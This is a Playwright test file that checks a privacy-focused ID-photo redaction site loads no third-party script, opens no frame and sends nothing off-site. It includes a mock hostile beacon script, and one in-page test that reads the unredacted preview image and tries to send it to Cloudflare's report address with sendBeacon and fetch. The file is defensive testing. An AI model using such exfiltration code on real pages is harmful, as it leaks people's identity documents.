// SPDX-License-Identifier: AGPL-3.0-or-later
// No third-party code at all: no script in the page that holds the photos (ADR 0023), and no frame
// either (ADR 0027 removed the counter frame of ADR 0024; visits are counted by the host, from its
// own request statistics). A review on 2026-11-26 showed that Cloudflare's analytics beacon
// (ADR 0015), or a substitute served at its address, could read the unredacted preview and send it
// to Cloudflare's report address. These tests serve the build as the public site, so anything that
// runs only there would run here, and they answer Cloudflare's addresses with a hostile script. They
// fail if any script from another origin runs in the app's page, if the page opens any frame, or if
// anything at all leaves for another site.
import { expect, test, type BrowserContext, type Page } from '@playwright/test'
import { controlled, toEditor } from './helpers.ts'

test.use({ locale: 'es-ES', baseURL: 'https://dnitapado.es/' })

const LOCAL = 'http://localhost:4173/'
/** The public host names the site runs on: one at the root, one under a subpath. */
const ROOT = 'https://dnitapado.es/'
const SITES = [ROOT, 'https://aasanchez.github.io/dnilimpio.es/']
const BEACON = 'https://static.cloudflareinsights.com/beacon.min.js'
const REPORT = 'https://cloudflareinsights.com/cdn-cgi/rum'

/**
 * Stands in for a hostile beacon, wherever it runs: it tries to read the preview from its own page
 * and from the page around it, and sends what it got to Cloudflare's report address.
 */
const HOSTILE = `
let got = 'nothing'
try { got = document.querySelector('#preview').toDataURL('image/png') } catch {}
try { got = parent.document.querySelector('#preview').toDataURL('image/png') } catch {}
try { got = top.document.body.innerHTML } catch {}
navigator.sendBeacon(${JSON.stringify(REPORT)}, got)
`

/** The counter page that the start screen embedded until ADR 0027, and what it held. */
const OLD_COUNTER = 'https://aasanchez.github.io/dnitapado-stats/'
const COUNTER_PAGE = `<!doctype html><html><head><meta charset="utf-8">
<script defer src="${BEACON}" data-cf-beacon='{"token": "test"}'></script></head><body></body></html>`

interface Sent { method: string; url: string; body: string }
interface Traffic { sent: Sent[] }

/**
 * Serves the local build at each public address. Every other request, from the page, a frame or a
 * worker, is recorded; Cloudflare's addresses and the old counter page are answered (with the
 * hostile script), so only the browser's own rules can stop them.
 */
async function asPublicSite (context: BrowserContext): Promise<Traffic> {
  const traffic: Traffic = { sent: [] }
  await context.route('**/*', async (route) => {
    const req = route.request()
    const url = req.url()
    const site = SITES.find((s) => url.startsWith(s))
    if (site !== undefined) {
      const res = await fetch(LOCAL + url.slice(site.length))
      const headers = Object.fromEntries([...res.headers].filter(([k]) => !['content-encoding', 'content-length'].includes(k)))
      await route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) })
      return
    }
    if (/^(blob|data):/.test(url)) { await route.continue(); return }
    traffic.sent.push({ method: req.method(), url, body: req.postData() ?? '' })
    if (url === OLD_COUNTER) await route.fulfill({ contentType: 'text/html', body: COUNTER_PAGE })
    else if (url === BEACON) await route.fulfill({ contentType: 'text/javascript', body: HOSTILE })
    else if (url.startsWith(REPORT)) await route.fulfill({ status: 204, headers: { 'access-control-allow-origin': '*' } })
    else await route.abort('blockedbyclient')
  })
  return traffic
}

/** Everything that left for another site, whoever sent it. */
const left = (t: Traffic): string[] => t.sent.map((s) => `${s.method} ${s.url}`)

/** Records the address of every script element that is ever added to the page, from the first byte. */
async function watchScripts (page: Page): Promise<void> {
  await page.addInitScript(() => {
    if (window !== window.top) return // only the app's own page
    const seen: string[] = []
    Object.defineProperty(window, '__scripts', { value: seen })
    new MutationObserver((records) => {
      for (const r of records) {
        for (const n of r.addedNodes) if (n instanceof HTMLScriptElement) seen.push(n.src === '' ? `inline:${n.type}` : n.src)
      }
    }).observe(document, { childList: true, subtree: true })
  })
}

/** Every script the app's page ever had, every script it holds now, and every resource it fetched. */
async function scriptsAndResources (page: Page): Promise<{ added: string[]; present: string[]; resources: string[] }> {
  return await page.evaluate(() => ({
    added: (window as unknown as { __scripts: string[] }).__scripts,
    present: [...document.scripts].map((s) => (s.src === '' ? `inline:${s.type}` : s.src)),
    resources: performance.getEntriesByType('resource').map((e) => e.name),
  }))
}

/** Scripts that do not come from this site: anything other than its own origin or the import map. */
function thirdParty (urls: string[], origin: string): string[] {
  return urls.filter((u) => u !== 'inline:importmap' && !/^(blob|data):/.test(u) && new URL(u).origin !== origin)
}

for (const site of SITES) {
  test(`at ${site}, from the start screen to a loaded card, no third-party script or frame, and nothing leaves`, async ({ page, context }) => {
    const traffic = await asPublicSite(context)
    await watchScripts(page)
    await page.goto(site)
    await expect(page.locator('h1')).toBeVisible()
    // The start screen is where the counter frame was (ADR 0024): no frame and no request now.
    await page.waitForTimeout(2000)
    await expect(page.locator('iframe')).toHaveCount(0)
    expect(left(traffic)).toEqual([])
    await page.locator('#start').click()
    await page.locator('#file-front').setInputFiles('tests/fixtures/synthetic-front.png')
    await expect(page.locator('#status-front')).toHaveText('Imagen cargada.')
    await page.waitForTimeout(6000) // past the idle callback that loaded the beacon before ADR 0023
    const origin = new URL(site).origin
    const s = await scriptsAndResources(page)
    expect(s.present.length).toBeGreaterThan(0)
    expect(thirdParty(s.added, origin)).toEqual([])
    expect(thirdParty(s.present, origin)).toEqual([])
    expect(thirdParty(s.resources, origin)).toEqual([])
    expect(left(traffic)).toEqual([])
    await expect(page.locator('iframe')).toHaveCount(0)
  })
}

test('under the service worker, the editor with both sides runs no third-party script', async ({ browser }) => {
  test.setTimeout(120_000)
  const context = await browser.newContext({ serviceWorkers: 'allow', locale: 'es-ES', baseURL: ROOT })
  const page = await context.newPage()
  const traffic = await asPublicSite(context)
  await watchScripts(page)
  await controlled(page)
  await toEditor(page)
  await page.waitForTimeout(6000)
  const s = await scriptsAndResources(page)
  expect(thirdParty(s.added, 'https://dnitapado.es')).toEqual([])
  expect(thirdParty(s.present, 'https://dnitapado.es')).toEqual([])
  expect(left(traffic)).toEqual([])
  await expect(page.locator('iframe')).toHaveCount(0)
  await context.close()
})

test('the CSP allows no third-party script, no connection and no frame', async ({ page, context }) => {
  await asPublicSite(context)
  await page.goto(ROOT)
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content') ?? ''
  const directive = (name: string): string[] => csp.split(';').map((d) => d.trim().split(/\s+/)).find((d) => d[0] === name)?.slice(1) ?? []
  // Only this site's files, WebAssembly compilation and the import map's hash.
  expect(directive('script-src').filter((v) => !/^'sha256-[A-Za-z0-9+/=]+'$/.test(v))).toEqual(["'self'", "'wasm-unsafe-eval'"])
  expect(directive('connect-src')).toEqual(["'none'"])
  expect(directive('default-src')).toEqual(["'none'"])
  // No frame-src, child-src or worker exception: frames fall back to default-src 'none'.
  expect(directive('frame-src')).toEqual([])
  expect(directive('child-src')).toEqual([])
  expect(csp).not.toMatch(/https?:/)
})

test('the page cannot open a frame to another site, not even the old counter page', async ({ page, context }) => {
  const traffic = await asPublicSite(context)
  await page.goto(ROOT)
  await expect(page.locator('h1')).toBeVisible()
  const blocked = await page.evaluate(async (src) => {
    const violation = new Promise<string>((resolve) => { document.addEventListener('securitypolicyviolation', (e) => { resolve(e.effectiveDirective) }, { once: true }) })
    const f = document.createElement('iframe')
    f.setAttribute('sandbox', 'allow-scripts')
    f.src = src
    document.body.append(f)
    return await violation
  }, OLD_COUNTER)
  expect(blocked).toBe('frame-src')
  await page.waitForTimeout(2000)
  // The frame's page was never requested, so the script inside it never ran or reported.
  expect(left(traffic)).toEqual([])
})

test('the audit attack fails: a substitute beacon cannot be loaded or send the preview', async ({ page, context }) => {
  test.setTimeout(120_000)
  const traffic = await asPublicSite(context)
  await toEditor(page)
  await expect(page.locator('#preview')).toHaveJSProperty('width', 1712)
  const result = await page.evaluate(async (src) => {
    // 1. Adding the old beacon by its address: Trusted Types refuses the URL, and the CSP would too.
    let added = 'loaded'
    try {
      const s = document.createElement('script')
      s.src = src
      await new Promise<void>((resolve, reject) => { s.onload = () => { resolve() }; s.onerror = () => { reject(new Error('blocked')) }; document.head.append(s) })
    } catch (e) {
      added = e instanceof Error ? e.name : 'blocked'
    }
    // 2. Code already in the page (as the beacon was) reads the preview and tries to send it.
    const png = (document.querySelector('#preview') as HTMLCanvasElement).toDataURL('image/png')
    // eslint-disable-next-line no-restricted-properties -- this test checks that the CSP blocks it
    const beacon = navigator.sendBeacon('https://cloudflareinsights.com/cdn-cgi/rum', png)
    let fetched = 'sent'
    try {
      await fetch('https://cloudflareinsights.com/cdn-cgi/rum', { method: 'POST', body: png, mode: 'no-cors' })
    } catch {
      fetched = 'blocked'
    }
    return { added, beacon: String(beacon), fetched, bytes: png.length }
  }, BEACON)
  expect(result.bytes).toBeGreaterThan(16_000) // the preview is there to steal
  expect(result.added).not.toBe('loaded')
  expect(result.fetched).toBe('blocked')
  // sendBeacon() may answer true and be stopped later: only the recorded traffic tells.
  await page.waitForTimeout(2000)
  expect(left(traffic)).toEqual([])
})

for (const [name, init] of [
  ['offline', () => { Object.defineProperty(Navigator.prototype, 'onLine', { get: () => false }) }],
  ['asking for Global Privacy Control', () => { Object.defineProperty(Navigator.prototype, 'globalPrivacyControl', { get: () => true }) }],
  ['sending no privacy signal', () => {}],
] as const) {
  test(`the start screen sends nothing to another site when the browser is ${name}`, async ({ page, context }) => {
    await context.addInitScript(init)
    const traffic = await asPublicSite(context)
    await page.goto(ROOT)
    await expect(page.locator('h1')).toBeVisible()
    await page.waitForTimeout(2000)
    await expect(page.locator('iframe')).toHaveCount(0)
    expect(traffic.sent).toEqual([])
  })
}
